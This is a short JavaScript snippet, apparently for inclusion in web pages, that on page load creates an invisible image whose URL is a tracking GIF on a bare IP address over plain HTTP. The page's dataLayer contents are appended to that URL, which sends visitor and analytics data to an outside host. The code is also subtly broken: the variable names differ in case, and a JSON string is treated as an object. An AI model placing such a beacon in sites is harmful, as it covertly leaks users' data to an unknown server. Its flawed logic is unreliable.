document.addEventListener("DOMContentLoaded", function(event) { 
	var node = document.createElement("img"); 
	var data = typeof datalayer === 'undefined' ? "" : jsonToQueryString(JSON.stringify(dataLayer));
	node.src = "http://178.32.22.53:8000/track.gif" + data;
});

function jsonToQueryString(json) {
    return '?' + 
        Object.keys(json).map(function(key) {
            return encodeURIComponent(key) + '=' +
                encodeURIComponent(json[key]);
        }).join('&');
}
